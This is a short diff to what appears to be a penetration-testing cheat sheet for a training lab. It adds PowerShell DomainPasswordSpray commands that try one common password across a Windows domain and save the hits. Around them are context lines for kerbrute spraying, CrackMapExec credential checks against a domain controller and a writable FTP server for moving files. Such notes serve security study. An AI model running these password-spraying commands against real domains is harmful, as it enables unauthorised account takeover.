@@ -17,6 +17,9 @@ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  W
 ##Validating the Credentials with CrackMapExec
 sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
 
+PS C:\Tools> import-module .\DomainPasswordSpray.ps1
+PS C:\Tools> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
+
 HTTP Brute Force
 
 wfuzz POST
@@ -187,3 +190,6 @@ ftp -s:ftpscript.txt
 server:
 
 python -m pyftpdlib  --port=2121 --write
+
+**Hex to decimal**
+https://byjus.com/maths/hex-to-decimal/
